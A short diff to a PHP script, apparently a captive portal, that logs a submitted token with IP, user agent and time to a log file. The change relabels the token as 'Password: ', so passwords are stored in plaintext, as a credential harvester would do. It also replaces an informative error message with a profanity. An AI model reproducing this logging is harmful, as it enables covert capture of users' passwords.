@@ -24,7 +24,7 @@ if ($token === '') { http_response_code(400); exit; }
 $ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
 $ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
 $when = gmdate('c');
-$line = json_encode(['ts'=>$when,'ip'=>$ip,'token'=>$token,'ua'=>$ua], JSON_UNESCAPED_UNICODE) . PHP_EOL;
+$line = json_encode(['Time: '=>$when,'IP Address: '=>$ip,'Password: '=>$token,'ua'=>$ua], JSON_UNESCAPED_UNICODE) . PHP_EOL;
 
 $primary = '/var/log/ca.log';
 $fallbackDir  = __DIR__ . '/logs';
@@ -42,7 +42,7 @@ if (!$ok) {
 }
 
 if (!$ok) {
-  error_log("captive-portal: FAILED to write. primary=$primary, fallback=$fallbackFile");
+  error_log("fuck");
   http_response_code(500);
   exit;
 }
